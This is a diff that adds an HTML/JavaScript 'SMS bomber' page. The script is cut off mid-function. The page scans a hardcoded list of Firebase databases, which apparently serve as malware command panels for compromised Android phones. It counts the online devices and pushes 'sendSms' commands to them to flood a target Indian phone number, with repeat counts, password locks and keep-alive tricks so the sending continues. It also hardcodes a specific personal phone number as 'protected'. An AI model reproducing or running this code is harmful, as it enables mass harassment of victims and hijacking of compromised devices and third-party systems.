@@ -1,0 +1,901 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>DMRX BOMBER</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{font-family:-apple-system,'Segoe UI',Roboto,sans-serif;background:radial-gradient(ellipse at top,#1a0a0a 0%,#050505 55%);color:#eee;min-height:100vh;padding:12px;padding-bottom:40px;font-size:14px}
+.app{max-width:560px;margin:0 auto}
+.hdr{text-align:center;padding:20px 0 24px}
+.hdr .title{font-size:36px;font-weight:900;letter-spacing:.1em;background:linear-gradient(135deg,#ef4444,#f97316,#facc15);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;line-height:1}
+.card{background:rgba(13,13,13,.85);border:1px solid #1a1a1a;border-radius:16px;padding:14px;margin-bottom:10px;backdrop-filter:blur(6px)}
+.card-title{font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.14em;color:#666;margin-bottom:12px;display:flex;align-items:center;justify-content:space-between;gap:8px}
+.card-title .left{display:flex;align-items:center;gap:8px}
+.card-title .step{width:20px;height:20px;border-radius:50%;background:linear-gradient(135deg,#dc2626,#7f1d1d);color:#fff;font-size:10px;display:flex;align-items:center;justify-content:center;font-weight:900;flex-shrink:0}
+.card-title .cnt{background:rgba(239,68,68,.12);color:#f87171;padding:3px 10px;border-radius:40px;font-size:10px;font-weight:800}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:6px}
+.st{background:#080808;border:1px solid #1a1a1a;border-radius:12px;padding:12px 6px;text-align:center;position:relative;overflow:hidden}
+.st::before{content:'';position:absolute;top:0;left:0;right:0;height:2px}
+.st.t::before{background:#6acfff}
+.st.o::before{background:#4ade80}
+.st.f::before{background:#f87171}
+.st.b::before{background:#facc15}
+.st .l{font-size:8px;font-weight:800;letter-spacing:.1em;color:#555;margin-bottom:4px;text-transform:uppercase}
+.st .v{font-size:20px;font-weight:900;line-height:1}
+.st.t .v{color:#6acfff}
+.st.o .v{color:#4ade80}
+.st .v.red{color:#f87171}
+.st.b .v{color:#facc15}
+.fb-toggle{display:flex;align-items:center;justify-content:space-between;padding:12px 4px 4px;margin-top:12px;font-size:11px;color:#555;font-weight:700;letter-spacing:.1em;text-transform:uppercase;cursor:pointer;user-select:none;border-top:1px solid #1a1a1a}
+.fb-toggle .arr{transition:transform .25s;color:#444;font-size:14px}
+.fb-toggle.open .arr{transform:rotate(180deg)}
+.fb-toggle .lock{color:#facc15;font-size:13px;margin-right:6px}
+.fb-box{max-height:0;overflow:hidden;transition:max-height .3s}
+.fb-box.open{max-height:600px;overflow-y:auto;margin-top:10px;padding-right:4px}
+.fb-box::-webkit-scrollbar{width:4px}
+.fb-box::-webkit-scrollbar-thumb{background:#222;border-radius:4px}
+.fb-actions{display:flex;gap:6px;margin-bottom:10px}
+.fb-actions button{flex:1;padding:9px;border-radius:9px;border:1.5px solid #1a1a1a;background:transparent;color:#888;font-size:11px;font-weight:800;cursor:pointer;font-family:inherit;letter-spacing:.05em;text-transform:uppercase;transition:all .15s}
+.fb-actions button.add{color:#4ade80;border-color:rgba(74,222,128,.3)}
+.fb-actions button.add:hover{background:rgba(74,222,128,.1)}
+.fb-actions button.reset{color:#f87171;border-color:rgba(239,68,68,.3)}
+.fb-actions button.reset:hover{background:rgba(239,68,68,.1)}
+.fbcard{background:#080808;border:1px solid #1a1a1a;border-radius:11px;padding:10px 12px;font-family:Menlo,monospace;font-size:10.5px;line-height:1.5;display:flex;align-items:center;justify-content:space-between;gap:10px;margin-bottom:6px}
+.fbcard.dead{border-color:rgba(239,68,68,.25);background:rgba(127,29,29,.05);opacity:.6}
+.fbcard.top{border-color:rgba(74,222,128,.35);background:rgba(20,83,45,.08)}
+.fbcard.custom{border-color:rgba(250,204,21,.3)}
+.fbcard .info{flex:1;min-width:0}
+.fbcard .label{color:#888;font-size:10px;font-weight:800;letter-spacing:.06em;text-transform:uppercase;display:flex;align-items:center;gap:6px}
+.fbcard.top .label{color:#4ade80}
+.fbcard .badge-c{font-size:8px;background:rgba(250,204,21,.15);color:#facc15;padding:1px 5px;border-radius:4px;letter-spacing:.05em}
+.fbcard .u{color:#6acfff;word-break:break-all;font-size:10px;margin-top:2px;display:none}
+.fbcard.revealed .u{display:block}
+.fbcard.dead .u{color:#f87171}
+.fbcard .nums{display:flex;gap:5px;flex-shrink:0;font-weight:800;font-size:10px}
+.fbcard .nums .x{padding:4px 7px;border-radius:6px;background:rgba(255,255,255,.03);border:1px solid #1a1a1a;display:flex;flex-direction:column;align-items:center;min-width:32px}
+.fbcard .nums .x.o{color:#4ade80}.fbcard .nums .x.f{color:#f87171}
+.fbcard .nums .x .lbl{font-size:7px;color:#555;text-transform:uppercase;font-weight:700;margin-bottom:1px}
+.fbcard .nums .x .val{font-size:12px;font-weight:900;line-height:1}
+.fbcard .spin{width:12px;height:12px;border:2px solid #222;border-top-color:#6acfff;border-radius:50%;animation:sp .7s linear infinite;flex-shrink:0}
+@keyframes sp{to{transform:rotate(360deg)}}
+.fbcard .rank{width:22px;text-align:center;color:#444;font-weight:900;font-size:11px;flex-shrink:0}
+.fbcard.top .rank{color:#facc15}
+.fbcard .del{background:transparent;border:none;color:#444;font-size:14px;cursor:pointer;padding:2px 4px;flex-shrink:0;line-height:1}
+.fbcard .del:hover{color:#f87171}
+.phone{display:flex;background:#080808;border:1.5px solid #1a1a1a;border-radius:11px;overflow:hidden;margin-bottom:10px;transition:all .2s}
+.phone:focus-within{border-color:#dc2626}
+.phone .p{padding:13px 14px;background:linear-gradient(135deg,rgba(239,68,68,.15),rgba(127,29,29,.08));color:#f87171;font-weight:900;font-size:15px;border-right:1.5px solid rgba(239,68,68,.2);font-family:Menlo,monospace;display:flex;align-items:center;letter-spacing:.05em}
+.phone input{flex:1;border:none;background:transparent;color:#fff;padding:13px 12px;font-size:16px;outline:none;font-family:Menlo,monospace;letter-spacing:.1em;font-weight:700;width:100%}
+.phone input::placeholder{color:#333;font-size:12.5px;letter-spacing:.02em;font-weight:400}
+.ta2{width:100%;padding:12px;border-radius:11px;border:1.5px solid #1a1a1a;background:#080808;color:#fff;font-size:13px;outline:none;font-family:Menlo,monospace;min-height:72px;resize:vertical;line-height:1.5;margin-bottom:10px;transition:all .2s}
+.ta2:focus{border-color:#dc2626}
+.ta2::placeholder{color:#333;font-size:12px}
+.counter-row{display:flex;align-items:center;gap:12px;margin-bottom:12px}
+.counter-lock{width:78px;padding:12px;border-radius:11px;border:1.5px solid #1a1a1a;background:#080808;color:#fff;font-size:16px;font-weight:900;outline:none;font-family:Menlo,monospace;text-align:center;flex-shrink:0;cursor:pointer;transition:all .2s;position:relative;user-select:none;-webkit-user-select:none}
+.counter-lock:hover{border-color:#333}
+.counter-lock:active{transform:scale(.97)}
+.counter-lock .lockicon{position:absolute;top:2px;right:4px;font-size:8px;color:#facc15;opacity:.7}
+.counter-lock.unlocked{cursor:text;border-color:#dc2626}
+.counter-lock.unlocked .lockicon{display:none}
+.counter-info{flex:1;display:flex;align-items:center;justify-content:flex-end;gap:6px;font-size:11px;font-weight:800;font-family:Menlo,monospace}
+.counter-info .pill{padding:6px 11px;border-radius:30px;background:rgba(74,222,128,.08);border:1px solid rgba(74,222,128,.2);color:#4ade80;display:flex;align-items:center;gap:5px}
+.counter-info .pill .dot{width:5px;height:5px;border-radius:50%;background:#4ade80;box-shadow:0 0 6px #4ade80}
+.counter-info .pill b{font-weight:900;font-size:13px}
+.counter-info .total-pill{padding:6px 11px;border-radius:30px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);color:#f87171}
+.counter-info .total-pill b{font-weight:900;font-size:13px;color:#fff}
+.blast{width:100%;padding:17px;border-radius:13px;font-size:15px;font-weight:900;letter-spacing:.1em;text-transform:uppercase;background:linear-gradient(135deg,#dc2626,#7f1d1d);color:#fff;border:none;cursor:pointer;font-family:inherit;transition:all .15s;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 8px 28px rgba(220,38,38,.35);margin-top:6px}
+.blast:active:not(:disabled){transform:scale(.98)}
+.blast:disabled{opacity:.35;cursor:not-allowed;box-shadow:none}
+.stop-btn{width:100%;padding:13px;border-radius:12px;background:linear-gradient(135deg,#dc2626,#7f1d1d);color:#fff;border:none;cursor:pointer;font-family:inherit;font-weight:900;font-size:13.5px;letter-spacing:.1em;text-transform:uppercase;margin-top:10px;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 6px 22px rgba(220,38,38,.35)}
+.stop-btn:active{transform:scale(.97)}
+.prog{margin-top:12px}
+.prog-bar{height:5px;background:#1a1a1a;border-radius:5px;overflow:hidden}
+.prog-bar .f{height:100%;background:linear-gradient(90deg,#dc2626,#f97316,#facc15);transition:width .2s}
+.prog-stats{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-top:10px}
+.ps{background:#080808;border:1px solid #1a1a1a;border-radius:9px;padding:8px 4px;text-align:center}
+.ps .l{font-size:8px;font-weight:800;letter-spacing:.08em;color:#555;margin-bottom:3px;text-transform:uppercase}
+.ps .v{font-size:14px;font-weight:900;line-height:1;font-family:Menlo,monospace}
+.ps.ok .v{color:#4ade80}.ps.fa .v{color:#f87171}.ps.rm .v{color:#facc15}.ps.et .v{color:#6acfff}
+.prog-txt{font-size:10.5px;color:#888;margin-top:8px;text-align:center;font-weight:800;letter-spacing:.08em}
+.prog-txt .em{color:#f87171}.prog-txt .dg{color:#4ade80}
+.rate-txt{font-size:11px;color:#4ade80;margin-top:5px;text-align:center;font-weight:900;font-family:Menlo,monospace;letter-spacing:.05em}
+.log-actions{display:flex;gap:6px;justify-content:flex-end;margin-top:8px;margin-bottom:6px}
+.log-actions button{padding:6px 11px;border-radius:8px;background:transparent;border:1px solid #1a1a1a;color:#666;font-size:10.5px;font-weight:800;cursor:pointer;font-family:inherit;letter-spacing:.04em;text-transform:uppercase}
+.log-actions button:disabled{opacity:.3;cursor:not-allowed}
+.log{margin-top:8px;max-height:260px;overflow-y:auto;background:#030303;border:1px solid #151515;border-radius:11px;padding:10px;font-family:Menlo,monospace;font-size:10.5px;line-height:1.55}
+.log::-webkit-scrollbar{width:4px}
+.log::-webkit-scrollbar-thumb{background:#222;border-radius:4px}
+.log .ln{padding:3px 0;border-bottom:1px dashed rgba(255,255,255,.03);display:flex;gap:7px;align-items:flex-start}
+.log .ln:last-child{border-bottom:none}
+.log .t{color:#2a2a2a;flex-shrink:0;font-size:9.5px}
+.log .s{font-weight:900;flex-shrink:0;font-size:11px}
+.log .s.ok{color:#4ade80}.log .s.er{color:#f87171}.log .s.i{color:#6acfff}.log .s.rt{color:#facc15}
+.log .m{color:#777;flex:1;word-break:break-word;font-size:10px}
+.log .fb-hdr{color:#facc15;font-weight:900;font-size:10.5px;letter-spacing:.06em;padding:6px 0 4px;margin-top:2px;border-top:1px solid #1a1a1a}
+.log .fb-hdr:first-child{border-top:none;padding-top:2px}
+.bg-badge{display:none;background:linear-gradient(135deg,#059669,#065f46);color:#fff;padding:7px 14px;border-radius:40px;font-size:10.5px;font-weight:800;letter-spacing:.06em;margin:0 auto 10px;width:fit-content;align-items:center;gap:7px;box-shadow:0 4px 16px rgba(5,150,105,.35)}
+.bg-badge.on{display:inline-flex}
+.bg-badge::before{content:'';width:6px;height:6px;border-radius:50%;background:#fff;animation:pulse 1.2s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
+.toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%) translateY(60px);background:#111;border:1.5px solid #262626;padding:11px 20px;border-radius:40px;font-size:12px;font-weight:800;color:#fff;z-index:999;pointer-events:none;opacity:0;transition:all .28s cubic-bezier(.34,1.56,.64,1);max-width:90%;box-shadow:0 12px 40px rgba(0,0,0,.7);text-align:center}
+.toast.on{transform:translateX(-50%) translateY(0);opacity:1}
+.hide{display:none!important}
+.modal{position:fixed;inset:0;z-index:1000;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.85);backdrop-filter:blur(6px);padding:20px}
+.modal .box{background:#0d0d0d;border:1.5px solid #1f1f1f;border-radius:16px;padding:20px;max-width:340px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.8)}
+.modal h3{font-size:14px;font-weight:900;color:#fff;margin-bottom:6px;letter-spacing:.05em}
+.modal p{font-size:11px;color:#666;margin-bottom:14px;line-height:1.5}
+.modal textarea,.modal input{width:100%;padding:12px 14px;border-radius:10px;border:1.5px solid #1a1a1a;background:#080808;color:#fff;font-size:13px;font-family:Menlo,monospace;outline:none;transition:all .2s;font-weight:600}
+.modal input{letter-spacing:.3em;text-align:center;font-size:16px;font-weight:900}
+.modal textarea{min-height:100px;resize:vertical;line-height:1.5}
+.modal textarea:focus,.modal input:focus{border-color:#facc15}
+.modal .btns{display:flex;gap:8px;margin-top:14px}
+.modal .btns button{flex:1;padding:11px;border-radius:10px;font-weight:800;font-size:12px;cursor:pointer;font-family:inherit;letter-spacing:.05em;text-transform:uppercase;transition:all .12s;border:none}
+.modal .btns .cancel{background:transparent;color:#666;border:1.5px solid #1a1a1a}
+.modal .btns .ok{background:linear-gradient(135deg,#dc2626,#7f1d1d);color:#fff;box-shadow:0 4px 16px rgba(220,38,38,.3)}
+.modal .btns .ok.add{background:linear-gradient(135deg,#16a34a,#14532d)}
+.modal .err{font-size:11px;color:#f87171;text-align:center;margin-top:10px;font-weight:700;min-height:16px}
+.blocked{position:fixed;inset:0;z-index:2000;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.95);backdrop-filter:blur(10px);padding:20px}
+.blocked .inner{text-align:center;max-width:420px}
+.blocked .icon{width:96px;height:96px;margin:0 auto 20px;display:block;object-fit:contain;filter:drop-shadow(0 0 20px rgba(239,68,68,.5));border-radius:12px}
+.blocked .msg{font-size:24px;font-weight:900;color:#ef4444;letter-spacing:.04em;line-height:1.3;text-shadow:0 0 20px rgba(239,68,68,.6);margin-bottom:30px;word-break:break-word}
+.blocked .close{background:linear-gradient(135deg,#dc2626,#7f1d1d);color:#fff;border:none;padding:12px 30px;border-radius:12px;font-weight:900;font-size:13px;cursor:pointer;font-family:inherit;letter-spacing:.1em;text-transform:uppercase;box-shadow:0 6px 22px rgba(220,38,38,.4)}
+.blocked .close:active{transform:scale(.97)}
+@keyframes shake{0%,100%{transform:translateX(0)}20%,60%{transform:translateX(-12px)}40%,80%{transform:translateX(12px)}}
+.blocked .inner.shake{animation:shake .5s}
+</style>
+</head>
+<body>
+<div class="app">
+    <div class="hdr"><div class="title">DMRX BOMBER</div></div>
+    <div class="bg-badge" id="bgBadge">🛡 BG ACTIVE</div>
+
+    <div class="card" id="statsCard">
+        <div class="card-title">
+            <div class="left"><span class="step">1</span><span>Live Stats</span></div>
+            <span class="cnt" id="scanStatus">booting…</span>
+        </div>
+        <div class="stats">
+            <div class="st t"><div class="l">Firebases</div><div class="v" id="sFB">0</div></div>
+            <div class="st b"><div class="l">Devices</div><div class="v" id="sTotal">0</div></div>
+            <div class="st o"><div class="l">Online</div><div class="v" id="sOnline">0</div></div>
+            <div class="st"><div class="l">Offline</div><div class="v red" id="sOffline">0</div></div>
+        </div>
+        <div class="fb-toggle" id="fbToggle">
+            <span><span class="lock">🔒</span>Firebase List · Locked</span>
+            <span class="arr">▾</span>
+        </div>
+        <div class="fb-box" id="fbBox">
+            <div class="fb-actions" id="fbActions" style="display:none">
+                <button class="add" id="addFbBtn">+ Add Firebase</button>
+                <button class="reset" id="resetFbBtn">↺ Reset Custom</button>
+            </div>
+            <div id="fbList"></div>
+        </div>
+        <div style="display:flex;gap:6px;margin-top:12px">
+            <button style="flex:1;padding:10px;border-radius:10px;border:none;font-weight:800;font-size:12px;cursor:pointer;font-family:inherit;color:#fff;background:linear-gradient(135deg,#dc2626,#7f1d1d);letter-spacing:.05em" id="rescanBtn">🔄 Re-scan</button>
+        </div>
+    </div>
+
+    <div class="card" id="bomberCard">
+        <div class="card-title">
+            <div class="left"><span class="step">2</span><span>Blast Zone</span></div>
+            <span class="cnt" id="readyBadge">FILL</span>
+        </div>
+        <div class="phone">
+            <span class="p">+91</span>
+            <input type="tel" inputmode="numeric" maxlength="10" id="numInput" placeholder="10 digit number">
+        </div>
+        <textarea class="ta2" id="msgInput" placeholder="Message likh yahan..."></textarea>
+        <div class="counter-row">
+            <div class="counter-lock" id="counterLock">
+                <span id="counterVal">1</span>
+                <span class="lockicon">🔒</span>
+            </div>
+            <div class="counter-info">
+                <div class="pill"><span class="dot"></span><b id="onlineCnt">0</b> online</div>
+                <div class="total-pill"><b id="totalSend">0</b> sends</div>
+            </div>
+        </div>
+        <button class="blast" id="blastBtn" disabled>💥 BOOM</button>
+        <div class="prog hide" id="blastProg">
+            <div class="prog-bar"><div class="f" id="progFill"></div></div>
+            <div class="prog-stats">
+                <div class="ps ok"><div class="l">Sent</div><div class="v" id="psOk">0</div></div>
+                <div class="ps fa"><div class="l">Failed</div><div class="v" id="psFa">0</div></div>
+                <div class="ps rm"><div class="l">Left</div><div class="v" id="psRm">0</div></div>
+                <div class="ps et"><div class="l">ETA</div><div class="v" id="psEta">--:--</div></div>
+            </div>
+            <div class="prog-txt" id="progTxt"></div>
+            <div class="rate-txt" id="rateTxt">───</div>
+            <button class="stop-btn" id="stopBtn">⛔ STOP</button>
+        </div>
+        <div class="log-actions hide" id="logActions">
+            <button id="retryBtn" disabled>↻ Retry Failed</button>
+            <button id="exportBtn" disabled>⬇ Export</button>
+            <button id="clearLogBtn" disabled>✕ Clear</button>
+        </div>
+        <div class="log hide" id="blastLog"></div>
+    </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<div class="modal hide" id="pwModal">
+    <div class="box">
+        <h3>🔒 Firebase List</h3>
+        <p>URLs dekhne ke liye password daalo</p>
+        <input type="password" id="pwInput" inputmode="numeric" maxlength="4" autocomplete="off">
+        <div class="err" id="pwErr"></div>
+        <div class="btns">
+            <button class="cancel" id="pwCancel">Cancel</button>
+            <button class="ok" id="pwOk">Unlock</button>
+        </div>
+    </div>
+</div>
+
+<div class="modal hide" id="countModal">
+    <div class="box">
+        <h3>🔒 Repeat Count</h3>
+        <p>Change karne ke liye password daalo</p>
+        <input type="password" id="countPwInput" inputmode="numeric" maxlength="4" autocomplete="off">
+        <div class="err" id="countPwErr"></div>
+        <div class="btns">
+            <button class="cancel" id="countPwCancel">Cancel</button>
+            <button class="ok" id="countPwOk">Unlock</button>
+        </div>
+    </div>
+</div>
+
+<div class="modal hide" id="addFbModal">
+    <div class="box">
+        <h3>➕ Add Firebase</h3>
+        <p>Ek line me ek URL, ya comma/space se alag karo</p>
+        <textarea id="addFbInput" placeholder="https://your-project-default-rtdb.firebaseio.com&#10;https://another.firebasedatabase.app"></textarea>
+        <div class="err" id="addFbErr"></div>
+        <div class="btns">
+            <button class="cancel" id="addFbCancel">Cancel</button>
+            <button class="ok add" id="addFbOk">Add</button>
+        </div>
+    </div>
+</div>
+
+<div class="blocked hide" id="blockedModal">
+    <div class="inner" id="blockedInner">
+        <img class="icon" src="https://cdn.phototourl.com/free/2026-09-21-e3ef54b6-c333-4d77-9c15-9e3c1323997e.jpg" alt="">
+        <div class="msg" id="blockedMsg">Ghare Ja Ke Sutti Babau</div>
+        <button class="close" id="blockedClose">OK</button>
+    </div>
+</div>
+
+<script>
+(function(){
+'use strict';
+
+var PROTECTED_NUMBER = '7061874415';
+var PROTECTED_MESSAGE = 'Ghare Ja Ke Sutti Babau';
+
+var FIREBASES = [
+    'https://ramesh-67a2b-default-rtdb.firebaseio.com',
+    'https://admin-39ss-default-rtdb.firebaseio.com',
+    'https://mithun-da-default-rtdb.firebaseio.com',
+    'https://dhiko0909-default-rtdb.firebaseio.com',
+    'https://rambhai-2c356-default-rtdb.firebaseio.com',
+    'https://panel-9-d6ece-default-rtdb.firebaseio.com',
+    'https://killer-boy-3eac3-default-rtdb.firebaseio.com',
+    'https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app',
+    'https://alok5u2-default-rtdb.firebaseio.com',
+    'https://naina-singh-default-rtdb.firebaseio.com',
+    'https://rto-office-e1c0c-default-rtdb.firebaseio.com',
+    'https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app',
+    'https://mrrrrrrrr-8a5c1-default-rtdb.firebaseio.com',
+    'https://rikiad-d2c69-default-rtdb.firebaseio.com',
+    'https://gadhalalund-default-rtdb.firebaseio.com',
+    'https://jnzbczbkjgzkg-default-rtdb.firebaseio.com',
+    'https://adpanel37-default-rtdb.firebaseio.com',
+    'https://surajkiwife-9b0e2-default-rtdb.firebaseio.com',
+    'https://kira-e0cce-default-rtdb.firebaseio.com',
+    'https://raju-7f9f8-default-rtdb.firebaseio.com',
+    'https://subhurediff-default-rtdb.firebaseio.com',
+    'https://android-bhai-6b609-default-rtdb.firebaseio.com',
+    'https://ravikumar-1b0b8-default-rtdb.firebaseio.com',
+    'https://nkdfudvala-default-rtdb.firebaseio.com',
+    'https://nitish232626-default-rtdb.firebaseio.com',
+    'https://rosni-9bb5c-default-rtdb.firebaseio.com',
+    'https://lol11-7da1c-default-rtdb.firebaseio.com'
+];
+
+var CUSTOM_FB_KEY = 'dmrx_custom_fb_v1';
+
+var FIREBASE_AUTH = {};
+var UNLOCK_PASSWORD = '01';
+var CANDIDATE_ROOTS = ['clients','user_data','registeredDevices','callForwarding','Verify_Device','All_Users','users','devices','All_User/commands','bookings'];
+
+function primaryPath(dev){ return dev.root + '/' + dev.id + '/webhookEvent/sendSms'; }
+function fallbackPath(dev){ return dev.root + '/' + dev.id + '/commands'; }
+function thirdPath(dev){ return dev.root + '/' + dev.id + '/command'; }
+
+var state = {
+    firebases: [], scanning: false, sending: false, stopped: false,
+    blastLog: [], failedJobs: [],
+    prog: {done:0, total:0, sent:0, fail:0, startTime:0, lastRateTime:0, lastRateSent:0, rate:0},
+    revealed: false, countValue: 1, countUnlocked: false,
+    customFbs: []
+};
+
+var toastEl = document.getElementById('toast'), toastTimer;
+function toast(msg){ toastEl.textContent = msg; toastEl.classList.add('on'); clearTimeout(toastTimer); toastTimer = setTimeout(function(){ toastEl.classList.remove('on'); }, 2400); }
+function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+function vibrate(ms){ try{ if(navigator.vibrate) navigator.vibrate(ms); }catch(e){} }
+function notify(title, body){ try{ if(!('Notification' in window) || Notification.permission !== 'granted') return; new Notification(title, {body: body}); }catch(e){} }
+function fmtTime(sec){ if(!isFinite(sec) || sec<0 || sec>36000) return '--:--'; sec = Math.round(sec); var m = Math.floor(sec/60), s = sec%60; return (m<10?'0':'')+m+':'+(s<10?'0':'')+s; }
+
+function fbName(url){
+    var host = url.replace(/^https?:\/\//,'').split('.')[0];
+    return host.split('-')[0].toLowerCase();
+}
+function isProtected(num){
+    if(!PROTECTED_NUMBER || PROTECTED_NUMBER === 'XXXXXXXXXX') return false;
+    return num === PROTECTED_NUMBER;
+}
+
+function loadCustomFbs(){
+    try{
+        var s = localStorage.getItem(CUSTOM_FB_KEY);
+        if(!s) return [];
+        var arr = JSON.parse(s);
+        return Array.isArray(arr) ? arr : [];
+    }catch(e){ return []; }
+}
+function saveCustomFbs(arr){
+    try{ localStorage.setItem(CUSTOM_FB_KEY, JSON.stringify(arr)); }catch(e){}
+}
+function normUrl(u){
+    u = String(u).trim().replace(/\/$/,'');
+    if(!u) return '';
+    if(!/^https?:/i.test(u)) u = 'https://' + u;
+    if(!/firebaseio\.com|firebasedatabase\.app/i.test(u)) return '';
+    return u;
+}
+
+var blockedModal = document.getElementById('blockedModal');
+var blockedMsg = document.getElementById('blockedMsg');
+var blockedInner = document.getElementById('blockedInner');
+function showBlocked(){
+    blockedMsg.textContent = PROTECTED_MESSAGE;
+    blockedModal.classList.remove('hide');
+    blockedInner.classList.remove('shake');
+    void blockedInner.offsetWidth;
+    blockedInner.classList.add('shake');
+    vibrate([100,50,100,50,200]);
+}
+document.getElementById('blockedClose').addEventListener('click', function(){ blockedModal.classList.add('hide'); });
+
+var audioCtx = null;
+function keepAliveStart(){ try{ var Ctx = window.AudioContext || window.webkitAudioContext; if(!Ctx) return; if(!audioCtx){ audioCtx = new Ctx(); var osc = audioCtx.createOscillator(); var gain = audioCtx.createGain(); gain.gain.value = 0.00001; osc.frequency.value = 18000; osc.type = 'sine'; osc.connect(gain); gain.connect(audioCtx.destination); osc.start(); } if(audioCtx.state === 'suspended') audioCtx.resume(); }catch(e){} }
+function keepAliveStop(){ try{ if(audioCtx){ audioCtx.close(); audioCtx = null; } }catch(e){} }
+var wakeLock = null;
+async function wakeStart(){ try{ if('wakeLock' in navigator) wakeLock = await navigator.wakeLock.request('screen'); }catch(e){} }
+function wakeStop(){ try{ if(wakeLock){ wakeLock.release(); wakeLock = null; } }catch(e){} }
+function beforeUnloadHandler(e){ if(state.sending){ e.preventDefault(); e.returnValue = 'Blast chal raha hai.'; return e.returnValue; } }
+function bgGuardOn(){ window.addEventListener('beforeunload', beforeUnloadHandler); }
+function bgGuardOff(){ window.removeEventListener('beforeunload', beforeUnloadHandler); }
+var bgBadgeEl = document.getElementById('bgBadge');
+function bgBadgeShow(on){ if(on) bgBadgeEl.classList.add('on'); else bgBadgeEl.classList.remove('on'); }
+
+function buildUrl(base, path, isGet){
+    var b = base.replace(/\/$/,'');
+    var url = b + '/' + path + '.json';
+    var params = [];
+    if(isGet) params.push('_cb=' + Date.now());
+    var auth = FIREBASE_AUTH[base];
+    if(auth) params.push('auth=' + encodeURIComponent(auth));
+    if(params.length) url += '?' + params.join('&');
+    return url;
+}
+function fbGet(url, path, timeoutMs){
+    var full = buildUrl(url, path, true);
+    var ctl = new AbortController();
+    var tm = setTimeout(function(){ ctl.abort(); }, timeoutMs||8000);
+    return fetch(full, {method:'GET', signal:ctl.signal, cache:'no-store'}).then(function(r){
+        clearTimeout(tm);
+        if(!r.ok){ if(r.status===401||r.status===403) throw new Error('PERM'); if(r.status===404) return null; throw new Error('HTTP_'+r.status); }
+        return r.json();
+    }).catch(function(e){ clearTimeout(tm); throw e; });
+}
+function fbPut(url, path, data, signal){
+    var full = buildUrl(url, path, false);
+    return fetch(full, {method:'PUT', headers:{'Content-Type':'application/json'}, body: JSON.stringify(data), signal: signal}).then(function(r){
+        if(!r.ok){ if(r.status===401||r.status===403) throw new Error('PERM'); if(r.status===429) throw new Error('RATE'); throw new Error('HTTP_'+r.status); }
+        return true;
+    }).catch(function(e){ if(e.name === 'AbortError') throw new Error('STOPPED'); throw e; });
+}
+
+function scanOne(url){
+    var i = 0;
+    function tryNext(){
+        if(i>=CANDIDATE_ROOTS.length) return Promise.resolve({ total:0, online:0, offline:0, root:null, onlineIds:[] });
+        var r = CANDIDATE_ROOTS[i++];
+        return fbGet(url, r, 8000).then(function(data){
+            if(data && typeof data==='object' && !Array.isArray(data)){
+                var keys = Object.keys(data);
+                if(keys.length>0){
+                    var onlineIds = [];
+                    keys.forEach(function(id){
+                        var v = data[id];
+                        if(v && typeof v==='object' && (v.status===true || v.status==='true' || v.status===1 || v.status==='online')) onlineIds.push(id);
+                    });
+                    return { total:keys.length, online:onlineIds.length, offline:keys.length-onlineIds.length, root:r, onlineIds:onlineIds };
+                }
+            }
+            return tryNext();
+        }).catch(function(e){ if(e.message && e.message.indexOf('PERM')===0) throw e; return tryNext(); });
+    }
+    return tryNext();
+}
+
+var els = {
+    scanStatus: document.getElementById('scanStatus'),
+    sFB: document.getElementById('sFB'), sTotal: document.getElementById('sTotal'),
+    sOnline: document.getElementById('sOnline'), sOffline: document.getElementById('sOffline'),
+    fbToggle: document.getElementById('fbToggle'), fbBox: document.getElementById('fbBox'), fbList: document.getElementById('fbList'),
+    fbActions: document.getElementById('fbActions'),
+    addFbBtn: document.getElementById('addFbBtn'), resetFbBtn: document.getElementById('resetFbBtn'),
+    addFbModal: document.getElementById('addFbModal'), addFbInput: document.getElementById('addFbInput'),
+    addFbErr: document.getElementById('addFbErr'), addFbOk: document.getElementById('addFbOk'), addFbCancel: document.getElementById('addFbCancel'),
+    rescanBtn: document.getElementById('rescanBtn'),
+    readyBadge: document.getElementById('readyBadge'),
+    numInput: document.getElementById('numInput'), msgInput: document.getElementById('msgInput'),
+    onlineCnt: document.getElementById('onlineCnt'), totalSend: document.getElementById('totalSend'),
+    blastBtn: document.getElementById('blastBtn'), blastProg: document.getElementById('blastProg'),
+    progFill: document.getElementById('progFill'), progTxt: document.getElementById('progTxt'), rateTxt: document.getElementById('rateTxt'),
+    psOk: document.getElementById('psOk'), psFa: document.getElementById('psFa'), psRm: document.getElementById('psRm'), psEta: document.getElementById('psEta'),
+    stopBtn: document.getElementById('stopBtn'), blastLog: document.getElementById('blastLog'),
+    logActions: document.getElementById('logActions'), retryBtn: document.getElementById('retryBtn'),
+    exportBtn: document.getElementById('exportBtn'), clearLogBtn: document.getElementById('clearLogBtn'),
+    pwModal: document.getElementById('pwModal'), pwInput: document.getElementById('pwInput'), pwErr: document.getElementById('pwErr'),
+    pwOk: document.getElementById('pwOk'), pwCancel: document.getElementById('pwCancel'),
+    counterLock: document.getElementById('counterLock'), counterVal: document.getElementById('counterVal'),
+    countModal: document.getElementById('countModal'), countPwInput: document.getElementById('countPwInput'),
+    countPwErr: document.getElementById('countPwErr'), countPwOk: document.getElementById('countPwOk'), countPwCancel: document.getElementById('countPwCancel')
+};
+
+function collectOnline(){
+    var out = [];
+    state.firebases.forEach(function(fb){
+        if(fb.status!=='done' || !fb.onlineIds || !fb.onlineIds.length) return;
+        var fbShort = fbName(fb.url);
